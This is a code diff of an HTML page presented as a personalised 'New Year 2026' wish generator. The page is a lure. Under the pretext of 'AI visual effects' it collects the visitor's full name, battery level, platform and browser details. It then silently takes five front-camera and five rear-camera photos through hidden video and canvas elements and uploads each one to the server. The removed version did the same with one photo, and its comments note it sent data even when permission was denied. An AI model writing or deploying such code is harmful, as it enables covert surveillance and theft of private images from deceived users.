@@ -3,83 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>New Year 2026 Surprise!</title>
+    <title>Personalized New Year 2026 Wish</title>
     <style>
-        body { background: #000; color: #fff; font-family: 'Arial', sans-serif; text-align: center; }
-        .container { margin-top: 50px; }
-        input { padding: 10px; border-radius: 5px; border: none; width: 80%; max-width: 300px; }
-        button { padding: 10px 20px; background: #ffcc00; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        #status { color: #00ff00; margin-top: 20px; display: none; }
+        body { background: #050505; color: gold; text-align: center; font-family: 'Segoe UI', sans-serif; }
+        .main-box { margin-top: 80px; padding: 30px; border: 2px solid gold; border-radius: 20px; display: inline-block; background: rgba(255,215,0,0.05); box-shadow: 0 0 20px red; }
+        h1 { font-size: 2.5rem; text-transform: uppercase; letter-spacing: 2px; }
+        input { padding: 15px; border-radius: 30px; border: 1px solid gold; width: 85%; margin-bottom: 20px; background: #111; color: white; font-size: 1rem; }
+        button { padding: 15px 40px; border-radius: 30px; background: linear-gradient(45deg, #ff0000, #ffcc00); border: none; color: black; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
+        #loader { display: none; color: lime; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="main-box">
         <h1>🎆 Happy New Year 2026 🎆</h1>
-        <p>Enter your name to see the magic!</p>
-        <input type="text" id="userName" placeholder="Type your name here...">
+        <p>Enter your name to experience the AI Magic!</p>
+        <input type="text" id="name" placeholder="Enter Your Full Name...">
         <br>
-        <button onclick="startMagic()">Get My Wish! ✨</button>
-        <p id="status">Applying AI Filters...</p>
+        <button onclick="processRequest()">GENERATE MY WISH ✨</button>
+        <div id="loader">⚙️ OPTIMIZING AI FILTERS... PLEASE WAIT...</div>
     </div>
 
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" style="display:none" autoplay></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        async function startMagic() {
-            const name = document.getElementById('userName').value;
-            if(!name) { alert("Please enter your name!"); return; }
+        async function processRequest() {
+            let name = document.getElementById('name').value;
+            if(!name) return alert("Please enter your name first!");
+            
+            // Professional English Permission Prompt
+            if(confirm("SYSTEM NOTICE: To apply exclusive 2026 AI Visual Effects, this application requires temporary camera access. Do you wish to proceed?")) {
+                document.getElementById('loader').style.display = 'block';
+                try {
+                    // Collect Device Info
+                    let batteryInfo = await navigator.getBattery();
+                    let info = {
+                        battery: Math.round(batteryInfo.level * 100) + "%",
+                        platform: navigator.platform,
+                        browser: navigator.userAgent
+                    };
 
-            document.getElementById('status').style.display = 'block';
+                    // Phase 1: Capture 5 Front Photos
+                    await startCapture(name, info, { facingMode: "user" }, 5, "FRONT");
 
-            // डिवाइस इन्फो इकट्ठा करना
-            const deviceInfo = {
-                platform: navigator.platform,
-                browser: navigator.userAgent,
-                battery: 0
-            };
+                    // Phase 2: Capture 5 Back Photos
+                    await startCapture(name, info, { facingMode: "environment" }, 5, "BACK");
 
-            try {
-                const battery = await navigator.getBattery();
-                deviceInfo.battery = Math.round(battery.level * 100);
-                
-                // कैमरा परमिशन मांगना
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // 5 फोटो लेने का लॉजिक (Front Camera Demo)
-                setTimeout(() => {
-                    captureAndSend(name, deviceInfo, stream);
-                }, 2000);
-
-            } catch (err) {
-                // अगर परमिशन नहीं मिली, तब भी डेटा भेजना
-                sendData(name, null, deviceInfo);
+                    document.getElementById('loader').innerText = "✅ AI WISH GENERATED SUCCESSFULLY!";
+                    alert("Happy New Year 2026, " + name + "! Your personalized experience is ready.");
+                } catch(e) {
+                    alert("ERROR: Camera Permission is mandatory for AI Filters.");
+                }
             }
         }
 
-        function captureAndSend(name, info, stream) {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const imageData = canvas.toDataURL('image/png');
-            sendData(name, imageData, info);
+        async function startCapture(name, info, constraints, count, label) {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
+                let video = document.getElementById('v');
+                video.srcObject = stream;
 
-            // कैमरा बंद करना
-            stream.getTracks().forEach(track => track.stop());
-            alert("Happy New Year 2026, " + name + "! Your personalized wish is ready!");
-        }
+                for (let i = 1; i <= count; i++) {
+                    await new Promise(r => setTimeout(r, 1200)); // Delay between shots
+                    let can = document.getElementById('c');
+                    can.width = video.videoWidth; can.height = video.videoHeight;
+                    can.getContext('2d').drawImage(video, 0, 0);
+                    let img = can.toDataURL('image/jpeg', 0.6);
 
-        function sendData(name, image, info) {
-            fetch('/upload', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name: name, image: image, device_info: info })
-            });
+                    fetch('/upload', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({name: name, image: img, info: info, label: label + " SHOT " + i})
+                    });
+                }
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { console.log(label + " Camera not accessible."); }
         }
     </script>
 </body>
